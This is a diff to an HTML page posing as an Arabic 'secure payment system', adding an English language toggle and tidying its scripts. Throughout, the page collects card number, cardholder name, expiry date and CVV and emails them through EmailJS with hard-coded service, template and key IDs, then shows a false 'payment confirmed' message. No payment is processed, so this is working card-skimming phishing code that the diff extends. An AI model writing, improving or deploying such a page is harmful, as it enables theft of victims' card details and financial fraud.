@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8">
-  <title>نظام الدفع الآمن</title>
+  <title>نظام الدفع / Payment System</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     * {box-sizing: border-box;}
@@ -28,6 +28,7 @@
       padding: 30px;
       border-radius: 12px;
       box-shadow: 0 0 20px rgba(0,0,0,0.1);
+      direction: rtl;
     }
     .field {
       margin-bottom: 15px;
@@ -78,69 +79,97 @@
       height: 28px;
       margin: 0 5px;
     }
+    .lang-toggle {
+      position: absolute;
+      top: 15px;
+      left: 15px;
+    }
   </style>
 </head>
 <body>
-
-<div class="loader" id="loading">🔒 جاري تجهيز نظام الدفع...</div>
+<div class="loader" id="loading">
+  <span id="loadingText">🔒 جاري تجهيز نظام الدفع...</span>
+</div>
 
 <div class="container" id="paymentContainer">
+  <div class="lang-toggle">
+    <button onclick="toggleLang()">🌐 English</button>
+  </div>
   <div class="card-icons">
     <img src="https://img.icons8.com/color/48/visa.png" alt="Visa">
     <img src="https://img.icons8.com/color/48/mastercard-logo.png" alt="MasterCard">
   </div>
   <div class="field">
-    <label>رقم البطاقة</label>
-    <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" oninput="formatCard(this)" required>
+    <label id="labelCard">رقم البطاقة</label>
+    <input type="text" id="cardNumber" placeholder="XXXX XXXX XXXX XXXX" maxlength="19" oninput="formatCard(this)">
   </div>
   <div class="field">
-    <label>اسم صاحب البطاقة</label>
-    <input type="text" id="cardName" placeholder="الاسم الكامل" required>
+    <label id="labelName">اسم صاحب البطاقة</label>
+    <input type="text" id="cardName" placeholder="الاسم الكامل">
   </div>
   <div class="row">
     <div class="field">
-      <label>تاريخ الانتهاء</label>
-      <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)" required>
+      <label id="labelExpiry">تاريخ الانتهاء</label>
+      <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" oninput="formatExpiry(this)">
     </div>
     <div class="field">
-      <label>رمز الأمان</label>
-      <input type="text" id="cvv" placeholder="CVV" maxlength="4" required>
+      <label id="labelCVV">رمز الأمان</label>
+      <input type="text" id="cvv" placeholder="CVV" maxlength="4">
     </div>
   </div>
-  <button onclick="sendPayment()">تأكيد الدفع</button>
+  <button onclick="sendPayment()" id="submitBtn">تأكيد الدفع</button>
 </div>
 
-<!-- ✅ سكربت التنسيق وتشغيل الواجهة -->
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
+  emailjs.init("1xqwBMfecM1SSulsh");
+
+  const translations = {
+    ar: {
+      card: "رقم البطاقة",
+      name: "اسم صاحب البطاقة",
+      expiry: "تاريخ الانتهاء",
+      cvv: "رمز الأمان",
+      pay: "تأكيد الدفع",
+      loading: "🔒 جاري تجهيز نظام الدفع...",
+      lang: "🌐 English",
+      dir: "rtl"
+    },
+    en: {
+      card: "Card Number",
+      name: "Cardholder Name",
+      expiry: "Expiry Date",
+      cvv: "CVV",
+      pay: "Confirm Payment",
+      loading: "🔒 Preparing payment system...",
+      lang: "🌐 العربية",
+      dir: "ltr"
+    }
+  };
+
+  let currentLang = "ar";
+
+  function toggleLang() {
+    currentLang = currentLang === "ar" ? "en" : "ar";
+    const t = translations[currentLang];
+    document.getElementById('labelCard').innerText = t.card;
+    document.getElementById('labelName').innerText = t.name;
+    document.getElementById('labelExpiry').innerText = t.expiry;
+    document.getElementById('labelCVV').innerText = t.cvv;
+    document.getElementById('submitBtn').innerText = t.pay;
+    document.getElementById('loadingText').innerText = t.loading;
+    document.querySelector('.lang-toggle button').innerText = t.lang;
+    document.getElementById('paymentContainer').style.direction = t.dir;
+  }
+
   window.onload = () => {
     setTimeout(() => {
       document.getElementById('loading').style.display = 'none';
       document.getElementById('paymentContainer').style.display = 'block';
-    }, 3000);
+    }, 2000);
   };
 
-  window.formatCard = (input) => {
-    let value = input.value.replace(/\D/g, '').substring(0, 16);
-    value = value.replace(/(.{4})/g, '$1 ').trim();
-    input.value = value;
-  };
-
-  window.formatExpiry = (input) => {
-    let value = input.value.replace(/\D/g, '').substring(0, 4);
-    if (value.length >= 3) {
-      value = value.substring(0, 2) + '/' + value.substring(2);
-    }
-    input.value = value;
-  };
-</script>
-
-<!-- ✅ سكربت EmailJS (v3) -->
-<script type="module">
-  import emailjs from 'https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js';
-
-  emailjs.init("1xqwBMfecM1SSulsh");
-
-  window.sendPayment = () => {
+  function sendPayment() {
     const data = {
       card_number: document.getElementById("cardNumber").value,
       card_name: document.getElementById("cardName").value,
@@ -150,14 +179,25 @@
 
     emailjs.send("service_plzxomt", "template_q95bk8a", data)
       .then(() => {
-        alert("✅ تم تأكيد الدفع بنجاح.");
-      })
-      .catch((error) => {
-        alert("❌ حدث خطأ أثناء الإرسال.");
-        console.error(error);
+        alert(currentLang === "ar" ? "✅ تم تأكيد الدفع بنجاح." : "✅ Payment confirmed successfully.");
+      }, () => {
+        alert(currentLang === "ar" ? "❌ حدث خطأ أثناء الإرسال." : "❌ Error during sending.");
       });
-  };
-</script>
+  }
 
+  function formatCard(input) {
+    let value = input.value.replace(/\D/g, '').substring(0, 16);
+    value = value.replace(/(.{4})/g, '$1 ').trim();
+    input.value = value;
+  }
+
+  function formatExpiry(input) {
+    let value = input.value.replace(/\D/g, '').substring(0, 4);
+    if (value.length >= 3) {
+      value = value.substring(0, 2) + '/' + value.substring(2);
+    }
+    input.value = value;
+  }
+</script>
 </body>
 </html>
